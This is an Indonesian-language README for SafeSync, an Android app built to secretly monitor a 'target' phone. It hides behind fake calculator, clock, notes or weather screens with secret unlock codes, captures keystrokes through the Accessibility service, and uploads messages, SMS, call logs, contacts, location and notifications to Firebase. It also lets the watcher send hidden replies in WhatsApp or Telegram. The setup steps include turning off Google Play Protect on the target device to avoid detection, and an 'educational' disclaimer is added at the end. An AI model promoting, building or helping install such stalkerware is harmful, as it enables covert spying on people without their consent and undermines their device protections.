# SafeSync 🛡️

SafeSync adalah aplikasi Android peran ganda (dual-role) yang dirancang untuk pemantauan tingkat lanjut dan sinkronisasi data antara dua perangkat (Host dan Client). Aplikasi ini dilengkapi dengan fitur **Stealth Mode** (Mode Penyamaran) bersenjatakan beberapa antarmuka aplikasi bohongan yang berfungsi penuh (seperti Kalkulator, Jam, Catatan, dan Cuaca) untuk menyamarkan operasinya pada perangkat target.

## Fitur Utama ✨

*   **Peran Ganda (Dual Roles):** Beroperasi sebagai **Host** (Pemantau) atau **Client** (Pengirim Data) dalam satu aplikasi yang sama.
*   **Mode Penyamaran (Stealth Camouflage):** Sebagai Client, aplikasi ini dapat secara dinamis mengubah ikon peluncur dan antarmukanya menjadi aplikasi bohongan yang dapat berfungsi normal layaknya aplikasi bawaan asli:
    *   **Kalkulator:** Kalkulator bersistem hitung matematika secara nyata.
    *   **Jam:** Layar jam digital aktual.
    *   **Catatan:** Papan teks catatan (Notes) asli.
    *   **Cuaca:** Antarmuka simulasi suhu dan cuaca.
*   **Pemicu Pembuka Rahasia (Secret Unlock Trigger):** Layar antarmuka bohongan (Client) hanya bisa ditembus menggunakan sentuhan fisik atau kode spesifik rahasia (contoh: mengetik `8888` lalu menekan tombol `=` pada kalkulator, atau menekan tahan/long-press teks suhu derajat angka celcius).
*   **Balasan Bayangan (Phantom Reply):** Host bisa membalas langsung secara jarak jauh untuk semua pesan target yang baru masuk (baik dari WhatsApp, Telegram, dll) secara senyap, tanpa harus membuka aplikasi pengirim asal pada perangkat target.
*   **Sinkronisasi Waktu-Nyata (Real-time Sync):** Secara otomatis mengirimkan Lokasi Perangkat, SMS, Riwayat Panggilan, Daftar Kontak, Daftar Aplikasi, Info Jaringan WiFi, laporan perekam layar ketikan (Keylogger), hingga membuang total Log Notifikasi target per harinya lewat cloud Firebase berkecepatan tinggi.

## Panduan Pemasangan & Konfigurasi Firebase Sendiri ⚙️

**Untuk jaminan keamanan privasi lalu-lintas data anda dari sisi server**, sangat direkomendasikan dan disarankan mengatur repositori Google Firebase pribadi Anda sendiri.

1.  **Buat Proyek Firebase Baru:** Gunakan akun anda di [Firebase Console](https://console.firebase.google.com/) dan buat proyek baru.
2.  **Aktifkan Layanan Ekstraksi Data:** Pastikan komponen integrasinya (**Firestore Database** diletakan pada skema Test Mode, Service **Authentication** tercentang khusus pada Anonymous Mode, dan Cloud **Storage**) telah dinyalakan aktif.
3.  **Tambahkan Aplikasi Android Anda:** Daftarkan perizinan komunikasi aplikasi Client Anda ke peladen (server) proyek Firebase dengan mengisi Package Name: `com.strix.safesync`.
4.  **Impor Berkas (Download) JSON Konfigurasi:** Taruh file verifikasi unik `google-services.json` ke folder/direktori internal Android Studio `app/` di proyek strix-lokasi Anda ini, sehingga ia merujuk otentikasi kompilasi build kepada firebase masing-masing individu secara merdeka.
5.  **Alternatif (Ubah Konfigurasi Otomatis Non-Recompile):** Anda dapat menekan "Server Guide" persis di dalam menu awal mode aplikasi tanpa perlu melakukan instruksi kompilasi baris kode. Letakan *App-Id* dan *Web-Api-Key* maka otomatis teralokasi langsung.

## Ketentuan Penggunaan & Peringatan Google Play Protect ⚠️

**Penting:** Karena SafeSync meretas aktivitas menggunakan hak jalan Service Latar Belakang (Foreground/Background Services) yang bersifat agresif, mengakses berbagai lapisan keamanan perangkat paling sensitif, menggunakan layanan **Aksesibilitas (Keylogger)** secara paksa, dan berkapabilitas untuk mengubah wujud sekaligus memutus ikon aslinya; maka **Google Play Protect AKAN MENANDAINYA sebagai Stalkerware/Spyware/Malware berbahaya bertaraf merah**.

*   Agar perangkat anda menghindari blokade instalasi protektif otomatis, buka setelan Google Play Store target -> Tekan menu akun **Play Protect** -> Pergi dan tekan icon roda gigi pojok (⚙️) Setup Options -> **Wajib mematikan saklar centang "Pindai aplikasi dengan Play Protect (Scan apps with Play Protect)"**.
*   Proyek repository ini ditujukan semata-mata khusus bagi instrumen **Tujuan Edukasi** riset keamanan Siber serta pemantauan pengujian perangkat berbasis ikatan persetujuan resmi lokal yang sah (contoh valid: *parental control* perangkat). Segala tindakan penggunaan fungsionalitas di luar pertanggung-jawaban resmi adalah mutlak perbuatan oknum developer penyalahguna.

## Kontribusi
Kami menerangkan tangan terbuka lebar menerima diskusi revisi format kode kolaboratif. Tolong luangkan berdiskusi pada panggung isu perihal komplain masalah sebelum semena-mena merekomendasikan sebuah Pull Request baru untuk menambal aplikasi dalam rasio modifikasi level atas.

## Lisensi
Berlisensi penuh oleh MIT License
